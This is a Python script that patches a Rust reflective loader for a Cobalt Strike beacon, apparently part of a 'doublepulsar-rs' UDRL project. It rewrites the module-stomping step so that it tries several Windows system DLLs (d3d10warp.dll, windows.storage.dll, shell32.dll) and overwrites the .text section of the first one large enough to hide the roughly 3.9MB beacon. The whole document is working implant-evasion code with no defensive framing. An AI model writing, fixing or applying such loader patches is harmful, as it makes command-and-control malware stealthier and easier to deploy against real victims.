# -*- coding: utf-8 -*-
r"""patch_titan_stomp.py - vendor patch: stomp-candidate list (d3d10 .text is
too small for a stock 4.9.1 beacon whose SizeOfImage is ~3.9MB)."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\bXZb-tmp"
     r"\doublepulsar-rs\udrl\src\loader.rs")
s = io.open(P, encoding="utf-8").read()

old = '''    // Step 6: Module stomp - load sacrificial DLL
    let module_base = api.kernel32.LoadLibraryExA(b"d3d10.dll\\0".as_ptr() as LPCSTR, null_mut(), DONT_RESOLVE_DLL_REFERENCES);

    if module_base.is_null() {
        dbg_print!(api, b"[LDR] FAIL: LoadLibraryExA\\n\\0");
        return;
    }

    let dos_header = module_base as *const IMAGE_DOS_HEADER;
    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
    let first_section = IMAGE_FIRST_SECTION(nt_headers);
    let text_rva = (*first_section).VirtualAddress as usize;
    let text_size = (*first_section).Misc.virtual_size as usize;
    let mut memory_buffer = (module_base as usize + text_rva) as *mut c_void;

    if reg.full > text_size {
        dbg_print!(api, b"[LDR] FAIL: payload too large for .text\\n\\0");
        return;
    }
'''

new = '''    // Step 6: Module stomp - load sacrificial DLL
    // VENDOR PATCH (C-47): stock d3d10.dll has ~0.9MB of .text while a stock
    // 4.9.1 beacon's SizeOfImage is ~3.9MB, so the hardcoded target always
    // failed the size check. Walk a candidate list and take the first module
    // whose .text fits reg.full (DONT_RESOLVE_DLL_REFERENCES keeps the load
    // inert on all of them).
    let candidates: [&[u8]; 4] = [
        b"d3d10warp.dll\\0",
        b"windows.storage.dll\\0",
        b"shell32.dll\\0",
        b"d3d10.dll\\0",
    ];
    let mut module_base: *mut c_void = core::ptr::null_mut();
    let mut dos_header: *const IMAGE_DOS_HEADER = core::ptr::null();
    let mut nt_headers: *mut IMAGE_NT_HEADERS = core::ptr::null_mut();
    let mut text_rva: usize = 0;
    let mut text_size: usize = 0;
    for name in candidates {
        let base = api.kernel32.LoadLibraryExA(name.as_ptr() as LPCSTR, null_mut(), DONT_RESOLVE_DLL_REFERENCES);
        if base.is_null() {
            continue;
        }
        let dos = base as *const IMAGE_DOS_HEADER;
        let nt = (base as usize + (*dos).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
        let sec = IMAGE_FIRST_SECTION(nt);
        let rva = (*sec).VirtualAddress as usize;
        let sz = (*sec).Misc.virtual_size as usize;
        if sz >= reg.full as usize {
            module_base = base as *mut c_void;
            dos_header = dos;
            nt_headers = nt;
            text_rva = rva;
            text_size = sz;
            dbg_print!(api, b"[LDR] Stomp candidate found\\n\\0");
            break;
        }
    }
    if module_base.is_null() {
        dbg_print!(api, b"[LDR] FAIL: no stomp candidate with large enough .text\\n\\0");
        return;
    }

    let first_section = IMAGE_FIRST_SECTION(nt_headers);
    let mut memory_buffer = (module_base as usize + text_rva) as *mut c_void;

    if reg.full > text_size {
        dbg_print!(api, b"[LDR] FAIL: payload too large for .text\\n\\0");
        return;
    }
'''

assert old in s, "stomp block not found"
s = s.replace(old, new, 1)
io.open(P, "w", encoding="utf-8", newline="").write(s)
print("stomp candidates patched")
